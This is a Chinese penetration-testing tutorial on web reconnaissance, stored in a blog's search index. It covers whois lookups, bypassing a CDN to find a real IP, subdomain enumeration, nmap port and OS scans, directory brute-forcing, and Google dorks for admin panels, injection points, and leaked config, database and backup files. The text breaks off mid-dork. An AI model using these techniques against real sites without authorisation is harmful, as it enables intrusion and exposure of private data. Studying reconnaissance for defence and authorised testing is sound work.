<?xml version="1.0" encoding="utf-8"?>
<search>
  
  
  
  <entry>
    <title>Web信息收集</title>
    <link href="/2023/07/20/WebSearching/"/>
    <url>/2023/07/20/WebSearching/</url>
    
    <content type="html"><![CDATA[<h1 id="收集域名信息"><a href="#收集域名信息" class="headerlink" title="收集域名信息"></a>收集域名信息</h1><h2 id="whois查询"><a href="#whois查询" class="headerlink" title="whois查询"></a>whois查询</h2><p>1、域名whois查询-站长之家</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">http:<span class="hljs-regexp">//</span>whois.chinaz.com/<br></code></pre></td></tr></table></figure><p><img src="https://img.tucang.cc/api/image/show/46b1980aa85bb1e2d56ea76b88e982f2"></p><p>2、IP138网站</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">https:<span class="hljs-regexp">//</span>site.ip138.com/<br></code></pre></td></tr></table></figure><p><img src="https://img.tucang.cc/api/image/show/55335d9779561d3ed448beaed7e48db0"></p><p>3、域名信息查询-腾讯云</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">https:<span class="hljs-regexp">//</span>whois.cloud.tencent.com/<br></code></pre></td></tr></table></figure><p><img src="https://img.tucang.cc/api/image/show/dfaa5b0d44d0919044e8069b6e04b0a3"></p><p>4、ICANN LOOKUP</p><figure class="highlight avrasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs avrasm"><span class="hljs-symbol">https:</span>//lookup.icann<span class="hljs-meta">.org</span>/<br></code></pre></td></tr></table></figure><p><img src="https://img.tucang.cc/api/image/show/55a5a5736cfad9b2db6d0e87f1cbcdd5"></p><h2 id="备案信息查询"><a href="#备案信息查询" class="headerlink" title="备案信息查询"></a>备案信息查询</h2><p>1、SEO综合查询</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">https:<span class="hljs-regexp">//</span>www.aizhan.com<span class="hljs-regexp">/cha/</span><br></code></pre></td></tr></table></figure><p><img src="https://img.tucang.cc/api/image/show/e14d14c8a3b47af4719e51b53ef85fb6"></p><p>2、ICP备案查询-站长工具</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">http:<span class="hljs-regexp">//i</span>cp.chinaz.com/<br></code></pre></td></tr></table></figure><p><img src="https://img.tucang.cc/api/image/show/13d3890799f612f6182beaa308f2633d"></p><h2 id="IP反查站点"><a href="#IP反查站点" class="headerlink" title="IP反查站点"></a>IP反查站点</h2><p>1、Dnslytics</p><p>利用Dnslytics反查IP可以得到如下信息</p><figure class="highlight stata"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs stata">IP information<br>Network information<br>Hosting information<br>SPAM database <span class="hljs-keyword">lookup</span><br><span class="hljs-keyword">Open</span> TCP/UDP ports<br>Blocklist <span class="hljs-keyword">lookup</span><br>Whois information<br>Geo information<br>Country information<br><span class="hljs-keyword">Update</span> information<br></code></pre></td></tr></table></figure><p>利用Dnslytics反查域名可以得到如下信息</p><figure class="highlight mathematica"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs mathematica"><span class="hljs-variable">Domain</span> <span class="hljs-variable">and</span> <span class="hljs-variable">Ranking</span> <span class="hljs-built_in">Information</span><br><span class="hljs-variable">Hosting</span> <span class="hljs-built_in">Information</span><span class="hljs-punctuation">&#123;</span><br>    <span class="hljs-variable">A</span> <span class="hljs-operator">/</span> <span class="hljs-variable">AAAA</span> <span class="hljs-built_in">Record</span><br>    <span class="hljs-variable">NS</span> <span class="hljs-built_in">Record</span><br>    <span class="hljs-variable">MX</span> <span class="hljs-built_in">Record</span><br>    <span class="hljs-variable">SPF</span> <span class="hljs-built_in">Record</span><br><span class="hljs-punctuation">&#125;</span><br><span class="hljs-variable">Web</span> <span class="hljs-built_in">Information</span><br><span class="hljs-variable">Whois</span> <span class="hljs-built_in">Information</span><br></code></pre></td></tr></table></figure><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">https:<span class="hljs-regexp">//</span>dnslytics.com/<br></code></pre></td></tr></table></figure><p><img src="https://img.tucang.cc/api/image/show/590762f7adb0cad11bc735d084170075"></p><h2 id="相关应用信息"><a href="#相关应用信息" class="headerlink" title="相关应用信息"></a>相关应用信息</h2><p>1、天眼查</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">https:<span class="hljs-regexp">//</span>www.tianyancha.com/<br></code></pre></td></tr></table></figure><p><img src="https://img.tucang.cc/api/image/show/661b4372c832755592a9c908811850fd"></p><p>2、七麦数据</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">https:<span class="hljs-regexp">//</span>www.qimai.cn/<br></code></pre></td></tr></table></figure><p><img src="https://img.tucang.cc/api/image/show/621a1b0803763faa545998449a9f153d"></p><h1 id="查找真实IP"><a href="#查找真实IP" class="headerlink" title="查找真实IP"></a>查找真实IP</h1><p>在一些大的网站都会使用CDN(内容分发网络)，它可以使内容传输的更快、更加稳定。，CDN系统能够实时地根据网络流量和各节点的连接、负载状况以及到用户的距离和响应时间等综合信息将用户的请求重新导向离用户最近的服务节点上。一般CDN隐藏了目标服务器的真实的IP，也提高了安全性。</p><h2 id="如何判断是否使用CDN"><a href="#如何判断是否使用CDN" class="headerlink" title="如何判断是否使用CDN"></a>如何判断是否使用CDN</h2><p>1、ping目标主域</p><p>通过ping目标主域，观察域名解析情况来判断是否使用CDN。</p><p>发现使用了CDN。</p><p><img src="https://img.tucang.cc/api/image/show/74d10acb6acb9071f4fd56db3078c079"></p><p>2、Nslookup</p><p>不同DNS解析结果若不一样，很有可能存在CDN服务。</p><p><img src="https://img.tucang.cc/api/image/show/f3e04104cb049e2d710c2f89e4cab359"></p><p>3、ping检测平台</p><p>Ping检测-站长工具</p><figure class="highlight avrasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs avrasm"><span class="hljs-symbol">http:</span>//<span class="hljs-built_in">ping</span>.chinaz.com/<br></code></pre></td></tr></table></figure><p><img src="https://img.tucang.cc/api/image/show/f5d6354f0e16d1cc1ed6bf6bc4ab18cb"></p><h2 id="绕过CDN常见方法"><a href="#绕过CDN常见方法" class="headerlink" title="绕过CDN常见方法"></a>绕过CDN常见方法</h2><p>1、ping主域</p><p>有的网站只让www域名使用CDN,可以去掉www在ping下。</p><p><img src="https://img.tucang.cc/api/image/show/f6d5f970ed86261864c4c387ba4f09a7"></p><p>2、DNS历史查找</p><p>CDN可能是在网站上线一段时间后才上线的，可以通过查找域名解析记录的方式去查找真实IP。以下介绍几个平台</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs awk">https:<span class="hljs-regexp">//</span>sitereport.netcraft.com/<br>https:<span class="hljs-regexp">//</span>viewdns.info/<br></code></pre></td></tr></table></figure><p><img src="https://img.tucang.cc/api/image/show/95b44d91cfb8ee6fd27a106a95c97c0c"></p><p><img src="https://img.tucang.cc/api/image/show/78f1c23d78f513037b2a5b8bacb63617"></p><p><img src="https://img.tucang.cc/api/image/show/09e1f106961750c635cf4a71d0f8762c"></p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">https:<span class="hljs-regexp">//</span>tools.ipip.net/cdn.php<br></code></pre></td></tr></table></figure><p><img src="https://img.tucang.cc/api/image/show/f47ff556e197a4734949f8efa1dee574"></p><p>3、查询子域名方法</p><p>一般都是主站加入CDN，子域名站点很多没有加入，可以通过子域名来获取，下边有收集子域名详细介绍，在这里举例一个。</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">https:<span class="hljs-regexp">//</span>x.threatbook.cn/<br></code></pre></td></tr></table></figure><p><img src="https://img.tucang.cc/api/image/show/c423fc87bbd87c15516e8985cc216863"></p><p>4、网站邮件头信息</p><p>比如说，邮箱注册，邮箱找回密码、RSS邮件订阅等功能场景，通过网站给自己发送邮件，从而让目标主动暴露他们的真实的IP，查看邮件头信息，获取到网站的真实IP。</p><p>注意：必须是目标自己的邮件服务器，第三方或公共邮件服务器是没有用的。</p><p>5、网络空间搜索引擎法</p><p>通过关键字或网站域名，就可以找出被收录的IP，很多时候获取到的就是网站的真实IP。</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs awk">钟馗之眼：https:<span class="hljs-regexp">//</span>www.zoomeye.org<br>Shodan：https:<span class="hljs-regexp">//</span>www.shodan.io<br>Fofa：https:<span class="hljs-regexp">//</span>fofa.so<br></code></pre></td></tr></table></figure><p><img src="https://img.tucang.cc/api/image/show/6b98f69c0e45b317559f80e04362b639"></p><p>6、网站漏洞查找</p><p>通过网站的信息泄露如phpinfo泄露，github信息泄露，命令执行等漏洞获取真实ip。</p><h1 id="收集子域名"><a href="#收集子域名" class="headerlink" title="收集子域名"></a>收集子域名</h1><h2 id="在线平台"><a href="#在线平台" class="headerlink" title="在线平台"></a>在线平台</h2><p>1、IP138</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">https:<span class="hljs-regexp">//</span>site.ip138.com/<br></code></pre></td></tr></table></figure><p><img src="https://img.tucang.cc/api/image/show/4775f94bd6b1997c269873e50ce6959c"></p><p>2、站长工具</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">http:<span class="hljs-regexp">//</span>tool.chinaz.com<span class="hljs-regexp">/subdomain/</span>?domain=<br></code></pre></td></tr></table></figure><p><img src="https://img.tucang.cc/api/image/show/8dbc9b0638ae4ae3bf8452af34319a0f"></p><p>3、hackertarget</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">https:<span class="hljs-regexp">//</span>hackertarget.com<span class="hljs-regexp">/find-dns-host-records/</span><br></code></pre></td></tr></table></figure><p><img src="https://img.tucang.cc/api/image/show/77e7af875ddffcdee6b0a7953fc77891"></p><p>4、phpinfo</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">https:<span class="hljs-regexp">//</span>phpinfo.me<span class="hljs-regexp">/domain/</span><br></code></pre></td></tr></table></figure><p><img src="https://img.tucang.cc/api/image/show/c693e614620702c6173e63085c4b183d"></p><p>5、dnsdumpster</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">https:<span class="hljs-regexp">//</span>dnsdumpster.com/<br></code></pre></td></tr></table></figure><p><img src="https://img.tucang.cc/api/image/show/b3a60b3ed74b029dcd9aed71b3abe618"></p><p>6、zcjun</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">http:<span class="hljs-regexp">//</span>z.zcjun.com/<br></code></pre></td></tr></table></figure><p><img src="https://img.tucang.cc/api/image/show/431e825630d3f69f4a9f13f9003529bc"></p><p>7、Censys</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">https:<span class="hljs-regexp">//</span>censys.io/certificates?q=<br></code></pre></td></tr></table></figure><p><img src="https://img.tucang.cc/api/image/show/887be079be9ab05d11f1e4dd8abc10b0"></p><h2 id="IP反查绑定域名网站"><a href="#IP反查绑定域名网站" class="headerlink" title="IP反查绑定域名网站"></a>IP反查绑定域名网站</h2><p>1、chinaz</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">http:<span class="hljs-regexp">//</span>s.tool.chinaz.com/same?s=<br></code></pre></td></tr></table></figure><p><img src="https://img.tucang.cc/api/image/show/7bca13385928811e1650642cdcc5f653"></p><p>2、爱站</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">https:<span class="hljs-regexp">//</span>dns.aizhan.com/<br></code></pre></td></tr></table></figure><p><img src="https://img.tucang.cc/api/image/show/f7ddc37108c979834516c4c12694cb72"></p><p>3、webscan.cc</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">https:<span class="hljs-regexp">//</span>www.webscan.cc/<br></code></pre></td></tr></table></figure><p><img src="https://img.tucang.cc/api/image/show/7c9c1129540acc258c4f78cd66fe2311"></p><h2 id="资产搜索引擎"><a href="#资产搜索引擎" class="headerlink" title="资产搜索引擎"></a>资产搜索引擎</h2><p>个人常用的有Google、FOFA，也可以使用Shodan、zoomeye钟馗之眼.</p><p>1、Google语法</p><p>常用语法</p><figure class="highlight ada"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs ada">site ：指定搜索域名 例如：site:baidu.com<br>inurl : 指定<span class="hljs-type">url</span>中是否存在某些关键字 例如：inurl:.php?id=<br>intext :  指定网页中是否存在某些关键字 例如：<span class="hljs-type">intext</span>:网站管理<br>filetype : 指定搜索文件类型 例如：<span class="hljs-type">filetype</span>:txt<br>intitle :  指定网页标题是否存在某些关键字 例如：<span class="hljs-type">intitle</span>:后台管理<br>link : 指定网页链接 例如：<span class="hljs-type">link</span>:baidu.com 指定与百度做了外链的站点<br>info : 指定搜索网页信息 <span class="hljs-type">info</span>:baidu.com<br></code></pre></td></tr></table></figure><p>2、FOFA语法</p><p>可以在首页点击查询语法来查看</p><p><img src="https://img.tucang.cc/api/image/show/6d8ca0880205ef951b375cea98a492d4"></p><h2 id="工具枚举"><a href="#工具枚举" class="headerlink" title="工具枚举"></a>工具枚举</h2><p>在这里常用的sublist3r、OneForAll、subDomainsBrute.</p><p>1、sublist3r</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">下载地址:https:<span class="hljs-regexp">//gi</span>thub.com<span class="hljs-regexp">/aboul3la/</span>Sublist3r<br></code></pre></td></tr></table></figure><p><img src="https://img.tucang.cc/api/image/show/2b98d493aae45bf9486aeba45de49023"></p><p>2、OneForAll</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">下载地址：https:<span class="hljs-regexp">//gi</span>thub.com<span class="hljs-regexp">/shmilylty/</span>OneForAll<br></code></pre></td></tr></table></figure><p><img src="https://img.tucang.cc/api/image/show/9ff4b06402688d42f02077d904f062ba"></p><p>运行完成后会生成一个csv文件</p><p><img src="https://img.tucang.cc/api/image/show/0af75f23b628b65ebd7b531f268feb69"></p><p>3、subDomainsBrute</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">下载地址：https:<span class="hljs-regexp">//gi</span>thub.com<span class="hljs-regexp">/lijiejie/</span>subDomainsBrute<br></code></pre></td></tr></table></figure><p><img src="https://img.tucang.cc/api/image/show/b1a70863e00ce99967f5c8010d41e1bc"></p><p><img src="https://img.tucang.cc/api/image/show/5b241c83d7d7102e2aa84c944381611e"></p><h2 id="利用DNS收集"><a href="#利用DNS收集" class="headerlink" title="利用DNS收集"></a>利用DNS收集</h2><p>常见的DNS记录有以下几类：</p><figure class="highlight dns"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs dns"><span class="hljs-keyword">A</span>记录       IP地址记录,记录一个域名对应的IP地址<br><span class="hljs-keyword">AAAA</span>记录    IPv6地址记录，记录一个域名对应的IPv6地址<br><span class="hljs-keyword">CNAME</span>记录   别名记录，记录一个主机的别名<br><span class="hljs-keyword">MX</span>记录      电子邮件交换记录，记录一个邮件域名对应的IP地址<br><span class="hljs-keyword">NS</span>记录      域名服务器记录 ,记录该域名由哪台域名服务器解析<br><span class="hljs-keyword">PTR</span>记录     反向记录，也即从IP地址到域名的一条记录<br><span class="hljs-keyword">TXT</span>记录     记录域名的相关文本信息<br></code></pre></td></tr></table></figure><p>MX记录：建立电子邮箱服务，将指向邮件服务器地址，需要设置MX记录。建立邮箱时，一般会根据邮箱服务商提供的MX记录填写此记录。</p><p><img src="https://img.tucang.cc/api/image/show/1eb305730d5aee6e912a0d72426ded06"></p><p>NS记录：域名解析服务器记录，如果要将子域名指定某个域名服务器来解析，需要设置NS记录。</p><p><img src="https://img.tucang.cc/api/image/show/0a023a439e647ba7b194be79948aefe3"></p><p>SOA记录：SOA叫做起始授权机构记录，NS用于标识多台域名解析服务器，SOA记录用于在众多NS记录中那一台是主服务器。</p><p><img src="https://img.tucang.cc/api/image/show/39f41cb55b12ad5328518e50c2686f81"></p><p>TXT记录：可任意填写，可为空。一般做一些验证记录时会使用此项，如：做SPF（反垃圾邮件）记录。</p><p><img src="https://img.tucang.cc/api/image/show/4452db8fed7346a8ca3ba1ae9454d95c"></p><p>DNS域传送漏洞</p><p>1、原理：DNS服务器分为：主服务器、备份服务器和缓存服务器。在主备服务器之间同步数据库，需要使用“DNS域传送”。域传送是指备份服务器从主服务器拷贝数据，并用得到的数据更新自身数据库。</p><p>若DNS服务器配置不当，可能导致攻击者获取某个域的所有记录。造成整个网络的拓扑结构泄露给潜在的攻击者，包括一些安全性较低的内部主机，如测试服务器。同时，黑客可以快速的判定出某个特定zone的所有主机，收集域信息，选择攻击目标，找出未使用的IP地址，绕过基于网络的访问控制。</p><p>2、DNS域传送漏洞检测</p><p>基本过程</p><ol><li><p>nslookup #进入交互式shell</p></li><li><p>server dns.xx.yy.zz #设定查询将要使用的DNS服务器</p></li><li><p>ls xx.yy.zz #列出某个域中的所有域名</p></li><li><p>exit #退出</p></li></ol><p>漏洞检测-不存在漏洞</p><p><img src="https://img.tucang.cc/api/image/show/d63041af22d67e9c779cd3a0ebe82745"></p><h1 id="站点信息收集"><a href="#站点信息收集" class="headerlink" title="站点信息收集"></a>站点信息收集</h1><h2 id="判断对方是win还是Linux"><a href="#判断对方是win还是Linux" class="headerlink" title="判断对方是win还是Linux"></a>判断对方是win还是Linux</h2><p>1、TTL值</p><p>可以通过ping来查看，不过不一定非常准可以被修改，默认Linux是64，win是128</p><p>Linux：</p><p><img src="https://img.tucang.cc/api/image/show/58b14f3d0a86b21558af995b3d78314e"></p><p>Windows：</p><p><img src="https://img.tucang.cc/api/image/show/1056fcd834dde8b85ea5badaf45499bf"></p><p>2、Nmap</p><p>使用命令：</p><p>nmap -O IP</p><p><img src="https://img.tucang.cc/api/image/show/67929f8bbba48b6672f2c621ccd01c64"></p><h2 id="端口收集"><a href="#端口收集" class="headerlink" title="端口收集"></a>端口收集</h2><p>nmap</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">nmap</span> -sV -p <span class="hljs-number">1</span>-<span class="hljs-number">65535</span> IP  # ping目标有回复时<br><span class="hljs-attribute">nmap</span> -sV -p <span class="hljs-number">1</span>-<span class="hljs-number">65535</span> -Pn IP  # ping目标没有回复时<br></code></pre></td></tr></table></figure><h2 id="CMS指纹识别"><a href="#CMS指纹识别" class="headerlink" title="CMS指纹识别"></a>CMS指纹识别</h2><p>CMS（内容管理系统）用于网站内容管理，通过识别CMS类型可以查看相应的漏洞拿下站点。</p><p>如今，网上一些在线的网站查询CMS指纹识别，如下所示：</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs awk">BugScaner: http:<span class="hljs-regexp">//</span>whatweb.bugscaner.com<span class="hljs-regexp">/look/</span><br>潮汐指纹：http:<span class="hljs-regexp">//</span>finger.tidesec.net/<br>云悉：http:<span class="hljs-regexp">//</span>www.yunsee.cn/info.html<br>WhatWeb: https:<span class="hljs-regexp">//</span>whatweb.net/<br>云悉指纹: http:<span class="hljs-regexp">//</span>www.yunsee.cn/finger.html<br>WhatWeb: https:<span class="hljs-regexp">//</span>whatweb.net/<br></code></pre></td></tr></table></figure><p><img src="https://img.tucang.cc/api/image/show/aac480d5c4cd5b7fac8006925b715e60"></p><h2 id="目录扫描"><a href="#目录扫描" class="headerlink" title="目录扫描"></a>目录扫描</h2><p>1、御剑扫描</p><p><img src="https://img.tucang.cc/api/image/show/39c6f08cbc39d5725cdeaffac35cfa59"></p><p>2、dirbuster</p><p>首先在Target URL输入框中输入要扫描的网址并将扫描过程中的请求方法设置为“Auto Switch(HEAD and GET)”。</p><p>自行设置线程（太大了容易造成系统死机哦）</p><p>选择扫描类型，如果使用个人字典扫描，则选择“List based bruteforce”选项。</p><p>单击“Browse”加载字典。</p><p>单机“URL Fuzz”，选择URL模糊测试（不选择该选项则使用标准模式）</p><p>在URL to fuzz里输入“&#x2F;{dir}”。这里的{dir}是一个变量，用来代表字典中的每一行，运行时{dir}会被字典中的目录替换掉。</p><p>点击“start”开始扫描</p><p><img src="https://img.tucang.cc/api/image/show/a167bc0133d97d3948955610b3211f4b"></p><p>也可以使用kali自带的</p><p><img src="https://img.tucang.cc/api/image/show/64ebcc9ba34d34b6524f8c30beec9306"></p><p>3、dirscan</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">下载地址：https:<span class="hljs-regexp">//gi</span>thub.com<span class="hljs-regexp">/j3ers3/</span>Dirscan<br></code></pre></td></tr></table></figure><p><img src="https://img.tucang.cc/api/image/show/779477dd611f2dbdf14f0b22870ece96"></p><p>4、dirsearch</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">下载地址：https:<span class="hljs-regexp">//gi</span>thub.com<span class="hljs-regexp">/maurosoria/</span>dirsearch<br></code></pre></td></tr></table></figure><p><img src="https://img.tucang.cc/api/image/show/89c4ee42ea2bc608dcab8586f3de3526"></p><h2 id="Google-Hacking"><a href="#Google-Hacking" class="headerlink" title="Google Hacking"></a>Google Hacking</h2><p>他基本语法上边有介绍，介绍下典型用法：</p><p>查找指定后台地址</p><figure class="highlight gherkin"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs gherkin">site:xx.com intext:管理 |<span class="hljs-string"> 后台 </span>|<span class="hljs-string"> 后台管理 </span>|<span class="hljs-string"> 登陆 </span>|<span class="hljs-string"> 登录 </span>|<span class="hljs-string"> 用户名 </span>|<span class="hljs-string"> 密码 </span>|<span class="hljs-string"> 系统 </span>|<span class="hljs-string"> 账号 </span>|<span class="hljs-string"> login </span>|<span class="hljs-string"> system</span><br><span class="hljs-string">site:xx.com inurl:login </span>|<span class="hljs-string"> inurl:admin </span>|<span class="hljs-string"> inurl:manage </span>|<span class="hljs-string"> inurl:manager </span>|<span class="hljs-string"> inurl:admin_login </span>|<span class="hljs-string"> inurl:system </span>|<span class="hljs-string"> inurl:backend</span><br><span class="hljs-string">site:xx.com intitle:管理 </span>|<span class="hljs-string"> 后台 </span>|<span class="hljs-string"> 后台管理 </span>|<span class="hljs-string"> 登陆 </span>|<span class="hljs-string"> 登录</span><br></code></pre></td></tr></table></figure><p>查看指定网站的文件上传漏洞</p><figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs vim">site:xx.<span class="hljs-keyword">com</span> inur<span class="hljs-variable">l:file</span><br>site:xx.<span class="hljs-keyword">com</span> inur<span class="hljs-variable">l:load</span><br>site:xx.<span class="hljs-keyword">com</span> inur<span class="hljs-variable">l:upload</span><br></code></pre></td></tr></table></figure><p>注入页面</p><figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs vim">site:xx.<span class="hljs-keyword">com</span> inur<span class="hljs-variable">l:php</span>?id=<br></code></pre></td></tr></table></figure><p>目录遍历漏洞</p><figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs vim">site:xx.<span class="hljs-keyword">com</span> intitle:<span class="hljs-built_in">index</span>.of<br></code></pre></td></tr></table></figure><p>SQL错误</p><figure class="highlight coq"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs coq">site:xx.com intext:<span class="hljs-string">&quot;sql syntax near&quot;</span> | <span class="hljs-type">intext</span>:<span class="hljs-string">&quot;syntax error has occurred&quot;</span> | <span class="hljs-type">intext</span>:<span class="hljs-string">&quot;incorrect syntax near&quot;</span> | <span class="hljs-type">intext</span>:<span class="hljs-string">&quot;unexpected end of SQL command&quot;</span> | <span class="hljs-type">intext</span>:<span class="hljs-string">&quot;Warning: mysql_connect()&quot;</span> | <span class="hljs-type">intext</span>:”Warning: mysql_query()<span class="hljs-string">&quot; | intext:”Warning: pg_connect()&quot;</span><br></code></pre></td></tr></table></figure><p>phpinfo()</p><figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs vim">site:xx.<span class="hljs-keyword">com</span> <span class="hljs-keyword">ex</span><span class="hljs-variable">t:php</span> intitle:phpinfo <span class="hljs-string">&quot;published by the PHP Group&quot;</span><br></code></pre></td></tr></table></figure><p>配置文件泄露</p><figure class="highlight coq"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs coq">site:xx.com ext:.xml | <span class="hljs-type">.conf</span> | <span class="hljs-type">.cnf</span> | <span class="hljs-type">.reg</span> | <span class="hljs-type">.inf</span> | <span class="hljs-type">.rdp</span> | <span class="hljs-type">.cfg</span> | <span class="hljs-type">.txt</span> | <span class="hljs-type">.ora</span> | <span class="hljs-type">.ini</span><br></code></pre></td></tr></table></figure><p>数据库文件泄露</p><figure class="highlight coq"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs coq">site:xx.com ext:.sql | <span class="hljs-type">.dbf</span> | <span class="hljs-type">.mdb</span> | <span class="hljs-type">.db</span><br></code></pre></td></tr></table></figure><p>日志文件泄露</p><figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs vim">site:xx.<span class="hljs-keyword">com</span> ext:.<span class="hljs-built_in">log</span><br></code></pre></td></tr></table></figure><p>备份和历史文件泄露</p><figure class="highlight coq"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs coq">site:xx.com ext:.bkf | <span class="hljs-type">.bkp</span> | <span class="hljs-type">.old</span> | <span class="hljs-type">.backup</span> | <span class="hljs-type">.bak</span> | <span class="hljs-type">.swp</span> | <span class="hljs-type">.rar</span> | <span class="hljs-type">.txt</span> | <span class="hljs-type">.zip</span> | <span class="hljs-type">.7z</span> | <span class="hljs-type">.sql</span> | <span class="hljs-type">.tar</span>.gz | <span class="hljs-type">.tgz</span> | <span class="hljs-type">.tar</span><br></code></pre></td></tr></table></figure><p>公开文件泄露</p><figure class="highlight coq"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs coq">site:xx.com filetype:.doc | <span class="hljs-type">.docx</span> | <span class="hljs-type">.xls</span> | <span class="hljs-type">.xlsx</span> | <span class="hljs-type">.ppt</span> | <span class="hljs-type">.pptx</span> | <span class="hljs-type">.odt</span> | <span class="hljs-type">.pdf</span> | <span class="hljs-type">.rtf</span> | <span class="hljs-type">.sxw</span> | <span class="hljs-type">.psw</span> | <span class="hljs-type">.csv</span><br></code></pre></td></tr></table></figure><p>邮箱信息</p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs stylus">site:xx<span class="hljs-selector-class">.com</span> intext:@xx<span class="hljs-selector-class">.comsite</span>:xx<span class="hljs-selector-class">.com</span> 邮件site:xx<span class="hljs-selector-class">.com</span> email<br></code></pre></td></tr></table></figure><p>社工信息</p><figure class="highlight gherkin"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs gherkin">site:xx.com intitle:账号 |<span class="hljs-string"> 密码 </span>|<span class="hljs-string"> 工号 </span>|<span class="hljs-string"> 